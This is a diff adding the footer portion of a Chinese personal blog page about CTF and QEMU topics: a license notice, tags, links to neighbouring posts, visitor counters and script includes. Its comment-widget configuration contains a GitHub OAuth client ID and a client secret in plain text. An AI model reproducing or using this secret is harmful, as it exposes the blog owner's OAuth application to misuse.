+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/qemu/" rel="tag"># qemu</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/5b4f46e3/" rel="prev" title="2021-0CTF-FINAL-kernote">
+                  <i class="fa fa-chevron-left"></i> 2021-0CTF-FINAL-kernote
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/c7dcc58a/" rel="next" title="CVE-2021-22555">
+                  CVE-2021-22555 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">feather</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">369k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"81ffc4880cfaf7b71e0b74e8581cca60"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
